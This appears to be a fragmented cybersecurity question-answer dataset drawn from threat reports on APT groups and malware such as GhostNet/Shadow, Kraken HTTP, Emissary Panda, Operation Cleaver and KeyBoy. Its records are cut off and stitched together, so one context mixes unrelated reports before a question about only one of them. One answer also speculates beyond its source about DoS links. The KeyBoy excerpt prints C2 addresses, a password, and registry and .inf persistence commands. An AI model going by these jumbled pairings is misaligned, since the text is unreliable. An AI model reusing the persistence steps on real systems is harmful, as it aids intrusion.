    "output": "Network Denial of Service (DoS) attacks aim to degrade or block the availability of targeted resources to users. In the context of the BlackEnergy APT group's attacks, their use of spearphishing with Word documents may seem unrelated to Network DoS at first glance. However, considering the group's history of conducting DDoS attacks, as mentioned in the report, it is possible that their spearphishing efforts are a precursor to a larger attack plan that includes Network DoS. The group's use of Word documents with macros could be a way to gain initial access to a target's network, which could then be used as a foothold to launch a Network DoS attack. Furthermore, the report mentions that the BlackEnergy APT group has targeted critical sectors in Ukraine, including energy and media companies. A Network DoS attack against these organizations could have significant consequences, including disrupting critical infrastructure and blocking access to important information. Therefore, while the use of spearphishing with Word documents may not be a direct example of a Network DoS attack, it could be a tactic used by the BlackEnergy APT group to ultimately conduct a Network DoS attack.",

    "instruction": "Answer based on context:\n\nBig Headline: 4.3.2 Affected Institutions\nDuring our investigations we found that a variety of personal information belonging to individuals had been compromised. This included various lists of contacts along with their personal details that could be used by the attackers. It also included information about travel, including air and rail tickets, receipts, invoices and other billing information. In addition we found personal banking information, scans of identification documents, job (and other) applications, legal documents and information about ongoing court cases. The attackers also exfiltrated personal email communications. All of this information can be leveraged for future attacks, especially attacks against those within the compromised individual's social network.\n\u2462\nNational Security Council Secretariat, India\nThe National Security Council Secretariat (NSCS) of India is comprised of the Joint Intelligence Committee and is a component of the National Security Council established in 1998 along with a Strategic Policy Group and an Advisory Board. The National Security Council is headed by the Prime Minister of India and is responsible for strategic planning in the area of national security (Subrahmanyam 2010; Indian Embassy 1998). We assess that a computer at the NSCS was compromised based on the documents exfiltrated by the attackers. During the period in which we monitored the attackers, fourteen documents, including two documents marked \"SECRET,\" were exfiltrated. In addition to documents containing the personal and financial\ninformation of what appears to be the compromised individual, the exfiltrated documents focus on India's security situation in the states of Assam, Manipur, Nagaland and Tripura as well as the Naxalites, Maoists, and what is referred to as \"left wing extremism.\"\n\u2462\nDiplomatic Missions, India\nIndia maintains numerous diplomatic missions abroad that provide consular services relating to passports and visas as well as faciltaing trade, commerce and engaging in diplomatic relations (Indian government 2010). We assess that computers at the Embassy of India, Kabul, the Embassy of India, Moscow, the Consulate General of India, Dubai, and the High Commission of India in Abuja, Nigeria were compromised based on the documents exfiltrated by the attackers. During the period in which we monitored the attackers, 99 documents, including what appears to be one encrypted diplomatic correspondence as well as five documents marked \"RESTRICTED\" and four documents marked \"CONFIDENTIAL,\" were exfiltrated. In addition to documents containing personal, financial, and travel information on embassy and diplomatic staff, the exfiltrated documents included numerous visa applications, passport office circulars, and country assessments and reports. Confidential visa applications from citizens of Afghanistan, Australia, Canada, the PRC, Croatia, Denmark, Germany, India, Ireland, Italy, New Zealand, Philippines, Senegal, Switzerland, Uganda, and the United Kingdom were among the exfiltrated documents.\n\u2462\nMilitary Engineer Services, India\nThe Military Engineer Services (MES) is a government construction agency that provides services to the Indian Army, Navy and Air Force. In addition, the MES services the government sector and civil works projects. We assess that computers at the MES-Bengdubi, MES-Kolkata, MES(AF)-Bangalore, and MES-Jalandhar were compromised based on the documents exfiltrated by the attackers. During the period in which we monitored the attackers, 78 documents were exfiltrated. While these documents included manuals and forms that would not be considered sensitive, they also included documents that contained private information on personnel, and documents and presentations concerning the financing and scheduling of specific engineering projects.\n\u2462\nMilitary Personnel, India\nWe assess that computers linked with the 21 Mountain Artillery Brigade in the state of Assam, the Air Force Station, Race Course, New Delhi and the Air Force Station, Darjipura Vadodara, Gujarat were compromised based on the documents exfiltrated by the attackers. During the period in which we monitored the attackers, sixteen documents were exfiltrated. One document contained personal information on Saikorian alumni of the Sainik School, Korukonda, which prepares students for entry into the National Defence Academy. One document is a detailed briefing on a live fire exercise while others pertain to surface-to-air missile systems and moving target indicators.\n\u2462\nMilitary Educational Institutions, India\nWe assess that computers at the Army Institute of Technology in Pune, Maharashtra and the Military College of Electronics and Mechanical Engineering in Secunderabad, Andhra Pradesh were compromised based on the documents exfiltrated by the attackers. During the period in which we monitored the attackers, twenty-one documents, including one marked \"RESTRICTED\", were exfiltrated. There are documents and presentations detailing the finances of one of the institutions as well as personal and private information on students and their travel. There is also a document that describes \"Project Shakti,\" the Indian Army's command and control system for artillery (India Defence 2007).\n\u2462\nInstitute for Defence Studies and Analyses, India\nWe assess that computers at the Institute for Defence Studies and Analyses (IDSA) were compromised based on the documents exfiltrated by the attackers. During the period in which we monitored the attackers, 187 documents were exfiltrated. While many of the documents were published papers from a variety of academic sources, there were internal documents, such as an overview of the IDSA research agenda, minutes of\nmeetings for the Journal of Defence Studies, budgets and information on a variety of speakers, visitors, and conference participants.\n\u2462\nDefence-oriented publications, India\nWe assess that computers at the India Strategic defence magazine and FORCE magazine were compromised based on the documents exfiltrated by the attackers. During the period in which we monitored the attackers, 58 documents were exfiltrated. While these documents include publicly accessible articles and previous drafts of those articles, there is also private information regarding the contact details of subscribers and conference participants. The documents also include interviews, documents, and PowerPoint presentations from conferences that detail national security topics, such as network data and monitoring for national security, and responses to combat cyber threats.\n\u2462\nCorporations, India\nWe assess that computers at YKK India Private Limited, DLF Limited, and TATA were compromised based on the documents exfiltrated by the attackers.

The email's body reveals a business-related topic: an offer to become member of this year's International Trade Council. Nevertheless, the offer is directed at the Philippine National Bank, not the enterprise actually receiving the email. This could be a trick to make the recipient even more curious to look at the attached document, because he/she received documents not issued for him/her.\nThe G DATA experts alerted the (<http://www.aecert.ae/>)aeCERT about the incident and their analysis results.\nBig Headline: The Malware, advertised on the Underground Market\n\"Kraken HTTP\" is sold on at least one underground market as a commercial product. Someone, who claims not to be the author of the malware, promoted the malware with a (<https://public.gdatasoftware.com/_download/kraken_advertisement.jpg>)kind of banner which has quite a visual impact. Have a look at the \"ad\" that was published back in December 2014.\nThe banner describes the botnet:\nits technical features\nthe available commands (classic ones, such as visiting a website using the infected bot, download and execute a command or a library, update and uninstall)\nthe plugins one can use: file stealer, ad-clicker, form grabber, \u2026\nThe command \"visiting a website\" using the infected bot could be used by the attackers as an entry point for blackmailing the infected user. The attackers could visit websites that are regarded as illegal in the respective country and could then ask for ransom and threaten to release information about the alleged violation to any seemingly official entity who would then investigate against the victim.\nThe flyer also reveals the price of the malware: The basic binary costs $320 and each plugin must be paid for separately, for example $50 for the file stealer, $60 for the ad-clicker and up to $350 for a configurable form grabber. Accepted payment methods are the usual virtual currencies and pre-paid options.\nA price list found on a different website, also posted in December 2014, lists the binary's price as $270 and some additional modules, such as a \"Edit Hosts module\" ($15), a \"Botkill module\" ($30) and a \"Bitcoin monitor module\"($20).\nFurthermore, \"Kraken HTTP\" is advertised as \"a new, revolutionary botnet [\u2026] and very (<http://en.wiktionary.org/wiki/noob>)noob-friendly\". Noob is a word describing \"that someone is new to a game, concept, or idea; implying a lack of experience.\" But now let's have a look at what the botnet really is.\nBig Headline: Feature: \"Anti-VM\"\nThe flyer explains that the botnet won't work in a virtual machine. To detect whether the malware is running in a virtual machine, the malware author checks if the following directories and the one file exist:\nC:\\Program Files\\VMWare\\VMware Tools\\\nC:\\Program Files (x86)\\VMware\\WMware Tools\\\nC:\\WINDOWS\\system32\\VBoxtray.exe\nFurthermore, the malware checks if following applications analysts usually use are being executed:\nWireshark: a network analyzer\nFiddler: a web proxy used to debug HTTP flow.\nWe can see the tools detection:\nIf one of the elements mentioned above is detected, the malware will display a rather poetic dialog popup:\nSo, the anti-VM is really rudimentary. If the additional tools are not installed on the virtual machine the malware can be perfectly executed.\nBig Headline: Feature: \"Bitcoin monitor plugin\"\nThe Bitcoin monitor plugin is even more amusing. It is not advertised on the flyer but on the other website we found. The malware monitors the infected user's clipboard. If the user copies a Bitcoin address to the clipboard, it will be replaced by an address pre-configured by the botmaster. A Bitcoin address is an identifier of 26-35 alphanumeric characters which represent the owner of a Bitcoin wallet, for example something like\n3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy.\nWe can easily imagine that the plugin's \"test\" is prone to produce false positives, because any alphanumeric text copied by the user will be automatically changed without reason if it has a length between 26 and 35 characters. Ok, we admit that the German word \"Kraftfahrzeughaftpflichtversicherung\" (36) would not be harmed when copied, but what about \"Bundesausbildungsfoerderungsgesetz\" (34) or \"radioimmunoelectrophoresis\" (27)? Just kidding. But any string, from strong passwords to bank account numbers and more could be affected.\nBig Headline: Conclusion\nWe suppose that the Kraken botnet was developed by a beginner. The malware does not include advanced malware technologies and no groundbreaking innovations, even though those were advertised. Many sensitive strings are not encrypted, such as installation paths, anti-virus listings, insults against the analysts and much more.\nTo sell the botnet malware, the author used a quite sexy marketing flyer, but, actually, the malware turned out to be rather simple.\n\"Kraken HTTP\" was (<http://www.scmagazine.com/symantec-details-reconnaissance-campaign-targeting-middle-eastern-companies/article/406470/>)said to be used during an espionage campaign against the energy sector, especially against targets in the UAE. We have now identified a specific target from this geographical region and have obtained one of the spear phishing emails used. Even though the targets that are known by now are rather high-level targets, the malware code as well as its features is not advanced.\nWe are surprised to see this piece of code has been used carrying out targeted attacks rather than broader criminal activities. It is not surprising that attackers use vulnerabilities that are older, because, unfortunately, many computers are likely to be still out of date and so the attack works. Despite the fact that the vulnerability used is not a new one, the malware does not have the common features that we saw during other targeted attack campaigns. Compared to incidents like Uroburos, the Kraken malware is not good enough to \"catch the big fish\" if we want to stick with to the metaphor. So, from the current point of view, there are three theories:\nThe attackers who developed the Kraken malware might have chosen to diversify their business and chose to attack special interest targets themselves.\nThe attackers identified infected machines in the business sector and followed the tracks to see what else they might be able to get from the companies.\nThe actual espionage team voluntary chose to use a kind of usual and rather simply botnet malware in order to distract analysts from seeing a deeper meaning behind this attack and make them disregard it as 'daily cybercrime business'.\nAttached Files:\n\u00a9 2007 - 2015 G Data Software AG.

It is assumed that the initial compromise occurred shortly before this event. Since the first C2 communication originated from the Exchange Server, and the event occurred very close to the first disclosure of the ProxyLogon vulnerability by Microsoft, the initial access vector is assumed to be ProxyLogon.\nAbout an hour after the initial compromise, Emissary Panda moved laterally to the file server as well as to a client. On both of these systems the HyperBro backdoor was dropped, as described in Section 8. On the same day, a file with the name \"Rar.exe\" was created on the server fileserver. The fact that the fileserver was the first target, and the creation of \"Rar.exe\", support the thesis that the main objective of the attack was espionage of intellectual property. With full access to the fileserver the objectives were fulfilled in the first days of the attack.\nMedium Headline: 5.2 Phase 2: Persistence\nAfter the objectives of initial access and data exfiltration were fulfilled, the next objective of this APT was persistence and remaining undetected (long-term access). These objectives were achieved in Phase 2 of the attack, which lasted from 08.03.2021 to 18.10.2021. During this time, only sparse activity from Emissary Panda was identified.\nThe activity includes regular beaconing to C2 addresses. Furthermore, irregular lateral movement to new systems was identified. This was probably performed to strengthen their persistence and protect their access against system replacements. At least two new systems were compromised during Phase 2.\n\nHow did Emissary Panda achieve its primary objective of espionage during the initial compromise phase, and what evidence supports this conclusion?

    "instruction": "Context: Medium Headline: Tarh Andishan/ Operation Cleaver\nIn April 2010, a worm called Stuxnet, allegedly jointly developed by the United States and Israel, targeted Siemens industrial control systems (ICS) in developing nations such as Iran (~59%), Indonesia (~18%), and India (~8%). Stuxnet contained a programmable logic controller (PLC) rootkit designed to spy upon, subvert, and in some cases sabotage Siemens supervisory control and data acquisition (SCADA) systems that regulated specific industrial systems. In particular, Stuxnet variants were deployed by a nation state actor against Iranian industrial facilities associated with its nuclear program, such as uranium enrichment facilities. The Stuxnet infection was discovered three months later, but variants continued to compromise Iranian systems through 2012. Iran's nuclear infrastructure and its oil and gas infrastructure was also targeted by the Duqu malware from 2009-2011, and the Flame malware in 2012. In response to adversarial cyber campaigns, Iran began rapidly developing its cyber infrastructure.\nIn December 2014, ICIT Fellow Cylance exposed Iranian threat actor, Tarh Andishan in the white paper of their 2-year Operation Cleaver investigation. Tarh Andishan was likely developed in response to the Stuxnet, Duqu, and Flame campaigns. Iran could be demonstrating to global targets that it is a major cyber power, capable of competing with countries such as the United States, China, and Russia, on the global cyber landscape. Cylance released Operation Cleaver early to allow potential targets the opportunity to mitigate the threat to their systems, so they estimate that they only discovered a portion of the activity of Tarh Andishan. Nevertheless, Cylance managed to build an impressive profile of Tarh Andishan's operation, including hacker profiles, domain names, internal infrastructure, and indicators of compromise.\nThe infrastructure used to host the attacks belonged to the corporate entity Tarh Andishan in Iran, after which the threat group is named. The infrastructure was hosted by an Iranian provider (Netafraz.com), and Autonomous System Networks (ASNs), IP source netblocks, and domains were registered in Iran. The netblocks utilized had strong associations to state-owned oil and gas companies that employ individuals with expert knowledge of ICS systems. Further, tools in the malware warn the attackers if their outward facing IP address traces back to Iran. The infrastructure utilized by the group is too robust and too centralized to have belonged to an individual or small \"grass-roots\" hacktivist group. This leads leading security firms, such as Cylance, to believe that Tarh Andishan is either state sponsored or a well-funded mercenary hacker group.\nIn Farsi, \"Tarh Andishan\" translates as \"Thinkers\", \"Innovators\", or \"Inventors\". Tarh Andishan consists of at least 20 dedicated hackers and developers, believed to be located in Tehran, Iran. Additional, members or hired associates operate out of the Netherlands, Canada, and the United Kingdom. Persian names (Salman Ghazikhani, Bahman Mohebbi, etc.) were used as hacker monikers. Most targets of Tarh Andishan speak English as a primary language and it appears that members of the group are proficient in reading and writing in English. Different members of the group specialize in different malware, different malware development tools, different programming languages and different adversary techniques.\nTarh Andishan targets government entities and critical infrastructure facilities in Canada, China, England, France, Germany, India, Israel, Kuwait, Mexico, Pakistan, Qatar, Saudi Arabia, South Korea, Turkey, United Arab Emirates, and the United States. Specifically, Tarh Andishan has been known to target: military installations, oil and gas facilities, energy facilities, utility facilities, transportation facilities, airlines, airports, hospitals, telecommunication companies, technology firms, institutions of education and research, aerospace and defense facilities, chemical companies, and governments. The expansive range of targets across the globe indicates that the Tarh Andishan campaign is likely a mechanism for gaining geopolitical leverage and establishing Iran as a cyber-power. Iran may be demonstrating that it can retaliate against any country that compromises its cyber-security.\nAcademic institution networks are often targeted by malware because universities, especially those that work with their government in some capacity, sponsor valuable research. Universities often store sensitive PII documents and research on local servers. Yet, university networks are de-centralized and often poorly secured because different schools on campuses host different networks that are supported by different IT teams and each network needs to be accessible to thousands of users with varying needs. While the origins of Stuxnet have never been definitively confirmed, it is believed to have originated out of a university research program. Tarh Andishan targets university networks for research, but according to Operation Cleaver, it also attempts to steal student PII, student photos for identification cards, and passport information from universities in the United States, India, Israel, and South Korea. Student PII and photos could be used for identity theft, but it could also be used for intelligence purposes because the next generation of government recruits and security researchers are currently students.\nTarh Andishan targeted airlines, airports, and transportation networks in South Korea, Saudi Arabia, and Pakistan by compromising Windows Active Directory and physical internal infrastructure such as Cisco edge switches, and routers. From there, the attackers stole VPN credentials so that they could establish a persistent presence and so that they could remotely access the entire infrastructure and supply chain. Tarh Andishan used the\ncompromised credentials and VPN access to compromise airport gates, access security control systems, make fraudulent payments with Paypal and Go Daddy, and to infect other internal infrastructure. Overall, Operation Cleaver saw Tarh Andishan dangerously compromise airline networks without encountering major resistance. Information exfiltrated by Tarh Andishan could put airline passengers at risk if Tarh Andishan used its access to compromise airline ICS, SCADA systems, or other critical infrastructure. Further, Windows Active Directory, Cisco edge switches, and routers are components of networks in almost every organization in almost every sector. Given its success, Tarh Andishan may easily adapt this technique to attack networks in other sectors of its attack profile, if it has not done so already.\nAccording to Cylance, Tarh Andishan's \"Initial compromise techniques include SQL injection, web attacks, and creative deception based attacks \u2013 all of which have been implemented in the past by Chinese and Russian hacking teams.\" Tarh Andishan did not appear to utilize zero-day exploits. The SQL injection attacks were made possible by attacking vulnerable applications that failed to sanitize input prior to passing it to a database in an SQL query. Later, Tarh Andishan began spear phishing attacks, which involved sending victims an email with a malicious link. One such attack told targets that they had been selected to apply for a new position at an industrial conglomerate and the link directed them to a copy of a legitimate resume creation website. The resume tool was combined with a binder tool that loaded malware onto created documents. The malware runs in the background of the victim's system and logs keystrokes and the information entered into forms. After the malware infected a host, the attackers would leverage existing, publically available, exploits (such as MS08-067) to escalate their privileges on Windows systems. The malware then propagated through the network like a worm, to compromise other systems on the network. Tarh Andishan compromises Microsoft Windows web servers that run Internet Information Services (IIS) and Coldfusion, Apache servers with PHP, Microsoft Windows desktops, and Linux servers. The group also targets popular network infrastructure such as Cisco VPNs, Cisco switches, and routers.\nTarh Andishan's most utilized malware, TinyZBot, gathers information from infected systems and it establishes backdoors for persistent access. TinyZBot uses the SOAP sub- protocol of HTTP to communicate with the C&C infrastructure and it abuses SMTP to exfiltrate data to the C&C servers. Among other capabilities, TinyZBot can also take screenshots of the system, download and execute arbitrary code, detect security software, disable some anti-virus, and modify PE resources. Once the malware has infected the system, Tarh Andishan can use customized tools to poison ARP caches, encrypt data, steal credentials, create backdoors, create ASP.Net shells, enumerate processes, record HTTP and SMB communications, detail the network environment, query Windows Management\nInstrumentation (WMI), log keystrokes, and more. Effectively, Tarh Andishan can customize their tools to suit any target. The Net Crawler tool, which combines popular attacker tools Windows Credential Editor, Mimikat, and PsExec, was used to gather the cached credentials from every accessible computer on the infected network. Shell Creator 2 was used to generate an ASPX web shell to protect the attacker from revealing internal information such as location by human error. The Nbrute utility uses NMap to map the network and then it attempts to determine network credentials via brute force. The attackers can also use tools such as the PVZ bot tool to log keystrokes on specific botted systems and save information on infected systems to specific locations.\n\nQuestion: Why was Tarh Andishan likely developed, and what were the motivations behind its creation?\n\nAnswer:",
    "output": "Tarh Andishan was likely developed in response to the Stuxnet, Duqu, and Flame campaigns that targeted Iran's nuclear infrastructure and oil and gas infrastructure. The motivation behind its creation was to demonstrate Iran's capability as a major cyber power, capable of competing with countries such as the United States, China, and Russia on the global cyber landscape.

    "instruction": "Big Headline: Background\nThe transition from patriotic hacking to cyber espionage is not an uncommon phenomenon. It typically follows an increasing politicization within the hacking community, particularly around geopolitical events. This is followed by increasing links between the hacking community and the state, particularly military and/or intelligence organizations.\nIn the late 1990's and early 2000's, a similar transition occurred within the Chinese hacking community. During that time period, the Chinese hacking community engaged in website defacements and denial of service attacks in conjunction with incidents such as the accidental bombing of the Chinese embassy in Belgrade in 1999, the collision of a U.S. spy plane and a Chinese military plane in 2001, and the Japanese Prime Minister's controversial visit to the Yasukuni shrine in 2005.4 Around this time a significant shift in philosophy began to take place.\nMembers of the Chinese hacking community that participated in such attacks soon found that transitioning to cyber espionage was more rewarding\u2014both in terms of developing a more advanced skill set as well as in monetary remuneration. One group known as NCPH (Network Crack Program Hacker), whose founding member \"Wicked/Withered Rose\" was a patriotic hacker, made the transition to cyber espionage by founding a \"hacker-for-hire\" group\nthat simultaneously developed an association with the Chinese military.5 The group began developing zero-day exploits, rootkits and remote access tools (RATs)\u2014using them in attacks against a variety of targets including the U.S. Department of Defense.6 (One of this group's associates, \"whg\", is still active and is believed to have developed one variant of the PlugX/SOGU malware.7) The rationale behind this transition within the Chinese hacking community is nicely summed up in a message by the \"Honker Union of China\" to its members in 2010:\n1 HP Security Research. \"Threat Intelligence Briefing Episode 11\". February 2014.\n2 Perlroth, N. \"In Cyberattack on Saudi Firm, U.S. Sees Iran Firing Back\". October 2012.\n3 Gallagher, S. \"Iranians hacked Navy network for four months? Not a surprise\". February 2014.\n4 Key. \"Honker Union of China to launch network attacks against Japan is a rumor\". September 2010.\nWhat benefit can hacking a Web page bring our country and the people? It is only a form of emotional catharsis, please do not launch any pointless attacks, the real attack is to fatally damage their network or gain access to their sensitive information.8\nIn Iran, the hacking community appears to be undergoing a similar transformation. While a variety of Iranian hacker groups had engaged in politically motivated website defacements, the emergence of the \"Iranian Cyber Army\" in 2009 demonstrated \"a concentrated effort to promote the Iranian government's political narrative online\". 9 They targeted, among others, news organizations, opposition websites and social media.10 This marked the beginning of a large-scale cyber offensive against the perceived enemies of the Iranian government.\nForeign news and opposition websites are routinely blocked in Iran, as are the tools that allow users in Iran to bypass these restrictions.11 One of the key stakeholders in Iran's Internet censorship program is the Iranian Revolutionary Guard Corps (IRGC), under which the Basij paramilitary organization operates.\nThe Basij formed the Basij Cyber Council and actively recruits hackers in order to develop both defensive and offensive cyber capabilities.12 There is increasing evidence to suggest that the hacker community in Iran is engaged in a transition from politically motivated defacements and denial of service attacks to cyber espionage activities. This model is consistent with the Basij's recruitment of paramilitary volunteer hackers to \"engage in less complex hacking or infiltration operations\" leaving the more technical operations to entities over which they have increasingly direct control.13\nAs such, the capabilities of threat actors operating from Iran have traditionally been considered limited.14 However, the \"Shamoon\" attacks, which wiped computers in Saudi Arabia and Qatar, indicate an improvement in capabilities.15 And unsurprisingly, Iran has reportedly increased its efforts to improve offensive capabilities after being targeted by Stuxnet and Flame.16\n5 Elegant, S. \"Enemies at The Firewall\".

    "output": "The capabilities of Iranian threat actors have improved due to several factors. Initially, their capabilities were considered limited, but significant events like the 'Shamoon' attacks, which wiped computers in Saudi Arabia and Qatar, demonstrated an enhancement in their abilities. Additionally, Iran's efforts to improve offensive capabilities were accelerated after being targeted by advanced cyber threats like Stuxnet and Flame. These external events served as catalysts, prompting Iran to invest more resources into developing their cyber warfare capabilities. The involvement of entities like the Basij Cyber Council in recruiting and organizing hackers has also played a pivotal role in this improvement, contributing to a more structured and effective approach to cyber espionage and offensive operations.",

    "output": "The GEMCUTTER downloader achieves persistence and prevents multiple instances from running simultaneously through several mechanisms. First, it creates two non-signaled events: 'MicrosoftGMMExit' and 'MicrosoftGMMHaveExit'. It then queries for the registry value 'HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\GetMM\\\\pid'. If this value does not exist, the malware sets it to the encoded malware process filename (each filename character incremented by one).

    "output": "Data obfuscation is a technique used by adversaries to hide command and control (C2) communications from detection. In the case of the EquationDrug APT, data obfuscation is used to conceal its C2 communications. Although the #Given Context# does not explicitly mention data obfuscation, it does mention that 'most of this information is carefully protected with obfuscation or encryption algorithms to prevent quick recognition.' This suggests that the EquationDrug APT uses data obfuscation to hide its internal strings and codenames, making it more difficult for analysts to understand the malware's behavior. Furthermore, the use of custom message-passing interfaces and kernel-mode components may also be used to obfuscate C2 communications. Additionally, the #Given Context# mentions that the link timestamp can be altered by the developer in a way that's not always possible to spot, which could be another form of data obfuscation used by the EquationDrug APT.

    "instruction": "Context: Big Headline: Appendix A: Decoding KeyBoy Config\nRecent versions of KeyBoy maintain encoded configuration data inside a file stored on disk. In the 20160509 sample used in the Tibetan Parliament campaign, this file was named wab32res.dat. The configuration file contains a 16 byte header followed by a number of bytes which are encoded using a novel algorithm. The 16 byte header stores an ascii character representation of the hexadecimal values corresponding to the size (in bytes) of the decoded config data, followed by the number of bytes containing encoded configuration data.\nThe sample under examination contained the following header, and Figure 7 shows the raw configuration file:\nThe configuration file used by this malware is encoded using what appears to be a custom schema. While some\nearlier versions of this backdoor used more simplified encoding techniques for the configuration data, newer versions have adopted a more involved algorithm.\nAt the heart of the decoding function is the use of a dynamically constructed lookup table containing sequences of bytes which represent the ASCII characters for the cleartext configuration data.\nAt the outset of the decoding function, a base lookup table is created containing 256 entries. This initial table can be thought of as an identity matrix, where, for each index, the lookup table contains the index as the stored value (see: Figure 8). For example:\nDuring the decoding of the configuration file, this table is expanded dynamically. Each iteration of the algorithm will populate the lookup table sequentially, beginning with index 0x102 (since the table index 0x101 is reserved).\nSmall Headline: Step 1\nThis step requires the algorithm to obtain an index value from the configuration file. In order to obtain this index, a decoding function evaluates the data in the configuration file not as successive bytes, but as a series of integers calculated by considering consecutive sequences of 9-bit binary values.\nFigure 9 provides a visual representation of this process. We can see that the first few indices being calculated by\nthis decoder are hexadecimal values 0x100, 0x39, 0x38, and 0x37. The first value, 0x100, is a 'marker' which denotes the beginning of the configuration data. The values 0x39, 0x38, and 0x37 are the first three indices used to obtain data from the lookup table.\nSmall Headline: Step 3\nAfter each iteration of calculating an index (step 1) and then obtaining the corresponding value from the lookup table (step 2), the algorithm will create a new entry in the lookup table at the next available index. The format of this new lookup table entry is simply the concatenation of the results of the previous lookup with the first byte of the current lookup (see: Figure 10).\nSo, again using the same example bytes along with Figures 9 and 10 above, if the current iteration of the algorithm\ndecoded the value 0x34 in step 1, and thus retrieved the value 0x34 = '4' in step 2, the newly formed lookup table entry would be:\nLookupTable[ 0x106 ] = [0x35,0x34] =>\n\"54\"\nThus, if at some future point in the decoding process the index 0x106 was obtained in step 1, the output to the configuration data would be the two bytes [0x35,0x34] which have ascii representation \"54\". This provides a method of data compression to the configuration file.\nA Python script was created for the purpose of automating this configuration file decoding process. The output of this script when run against the configuration file used by the first of the two Parliamentarian operation samples yielded the following data:\nIdentity Code: 9876543210\nC2 Host/IP #1: 45.125.12.147\nC2 Host/IP #2:\n103.40.102.233\nC2 Host/IP #3: 45.125.12.147\nC2 Port #1: 443\nC2 Port #2: 443\nC2 Port #3: 443\nPassword: tibetwoman\nCampaign ID: NNNN\nMedium Headline: Installation\nThis sample was discovered inside a malicious PowerPoint slide show which carried lure content consistent with an Indian-nexus, and which was uploaded to VirusTotal in April 2015 using the filename athirappalli.pps.

This malicious .pps file was weaponized using (closely related to CVE-2014-4114 aka Sandworm, which we have previously (<https://citizenlab.org/2015/06/targeted-attacks-against-tibetan-and-hong-kong-groups-exploiting-cve-2014-4114/>)observed this exploit used against the Tibetan community) to execute the following embedded DLL:\nName: SystemCertificates.ocx\n495616\nMedium Headline: Persistence\nThis DLL maintains persistence by setting the following registry entry in the\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key: SystemCertificates \u2192 \"cmd /c start\ndll32.exe %APPDATA%\\Microsoft\\SystemCertificates\\SystemCertificates.ocx,\nRun SSSS\nThis registry key is set via the Sandworm exploit, as the execution of an .inf file containing the following\ninstructions are triggered:\n[DefaultInstall]\nCopyFiles =\nRxCopy\nAddReg = RxStart\n[RxCopy]\n..\\..\\Roaming\\Microsoft\\SystemCertificates\\SystemCertificates.ocx, contact.pdf\nHKCU,Software\\Microsoft\\Windows\\CurrentVersion\\Run,SystemCertificates,,\"cmd /c start Rundll32.exe %APPDATA%\\Microsoft\\SystemCertificates\\SystemCertificates.ocx, SSSS\"\nIn comparison with the prior generation of KeyBoy examined by Rapid7, this mechanism represents a change to registry based persistence from the previously used Windows service.\nMedium Headline: Installation\nThis .rtf document, also exploiting CVE-2012-0158, was submitted to (<https://virustotal.com/en/file/ba442907f3218c8664bbecb47f915c4469340219e0f05af8f2d108d72659ff0f/analysis/>)VirusTotal in March 2016. The exploit triggers the execution of an embedded dropper, similar to the method observed in our initial sample described in Part 1.\nThis dropper creates three files on disk, each in the %localappdata% folder:\n1. cfs.dat \u2013 KeyBoy configuration file\n2. cfsupdate.dal \u2013 KeyBoy payload DLL\n3. desk.vbs \u2013 Windows script used for installation\nThe Windows script file, desk.vbs, contained the following content:\nThe dropper executes this script file which subsequently launches the KeyBoy backdoor and sets persistence as described below.\nAlso noteworthy in this sample was the fact that this payload inspected the architecture of the victim PC to determine if it was 64 bit capable. If so, a 64 bit version of the payload was decoded from the data section of the cfsupdate.dat file using an XOR operation having key 0x90. This is very similar to the method described by Trend Micro in their (<http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-operation-tropic-trooper.pdf>)report on the TROJ_YAHOYAH malware.\nInterestingly, the 64-bit module was packed using a known freeware binary packer. This is in contrast to the 32-bit versions of KeyBoy, none of which contained any binary protections whatsoever. Upon unpacking, the 64-bit version of this KeyBoy code was functionally identical to the 32-bit version.\nMedium Headline: Configuration\nThe configuration file used by this version of KeyBoy is written to disk as %localappdata%\\cfs.dat by the dropper, similar to the behaviour of our 20160509 sample. This configuration file uses the newer encoding method outlined above and in Appendix A.

    "instruction": "Answer based on context:\n\nBig Headline: 5.3 Notification\nInvestigations of malware activity, such as that undertaken as part of the Shadow and GhostNet investigations, can yield information about the network infrastructure of the attackers, information about those who have been compromised, and confidential or private documents or other data that may have been exfiltrated without prior knowledge. Access to this information on all levels raises a number of practical, ethical and legal issues, many of which are unclear given the embryonic nature of the field of inquiry as a whole.\nThroughout this investigation, we have been conscious of these issues and have attempted to meet a professional standard in terms of planning and documenting our steps taken in the process of notification. This entailed research into existing practices and principles, and engagement with the law enforcement, intelligence and security communities in a number of countries. We were also conscious of the need to comply with the domestic laws in whose context this investigation was undertaken \u2014 namely those of India, the United States and Canada \u2014 as well as principles governing all academic research at the University of Toronto, where the Citizen Lab is located.\nNotification itself can be broken down into several categories, each of which entails complicating factors. First, there is notification that is required to takedown the command and control infrastructure, typically to the hosting and service provider companies through which the malware networks operate and on which they are hosted. Complicating matters, these services can be located in numerous national jurisdictions and subject to a variety of privacy laws and norms. Second, there are issues around notification of victims, such as governments, businesses, NGOs and individuals. This type of notification is perhaps the most challenging on ethical, practical and legal grounds. Notification of governments, for example, can be a very sensitive matter, especially if classified documents are involved or information is retrieved that is relevant to national security concerns. The same holds true of notification to individuals or businesses. At what point should a researcher notify a victim? Who within the organization, whether it is a government, a business or an NGO, is the appropriate point of contact for the notification? What if the notification jeopardizes a third party's security, or leads to some kind of retaliation or retribution? Should researchers notify law enforcement and intelligence agencies in their own countries before reaching out to foreign governments?\nExisting practices in this area are underdeveloped and largely informal. In part, this reflects the fact that global cyber security is still an embryonic field. But it also speaks to the very real problem of competitive power politics at the highest levels of national security, which tend to restrict information sharing in sensitive areas around cyber crime and espionage. Generally speaking, information sharing among law enforcement and intelligence agencies across borders is tentative at best, with the exception of that which occurs among close allies with deeply entrenched and long-standing links. Outside of those security communities, notification of services and governments tends to be restricted to specialist technical communities, telecommunications operators, and network administrators, if it occurs at all. Consequently, notification of the types referred to above can be ad hoc and inconsistent, largely contingent on the informal connections among professional communities.\nAll of these issues were grappled with in the aftermath of the Tracking GhostNet report, and throughout the course of the Shadow investigation. Our experiences in the aftermath of GhostNet, where notification was left incomplete, prompted a more deliberate and self-conscious approach with the Shadow investigation. We were also fortunate to have within our collaboration the experiences of the Shadowserver Foundation, whose counsel on notification helped in making decisions about timing and contacts.\nBy the end of November 2009, we were confident in our access to the basic command and control infrastructure and identification of some of the key documents at hand. Upon the realization that some information about individual Canadians was compromised, we notified Canadian authorities in December 2009 about the investigation, the compromise of 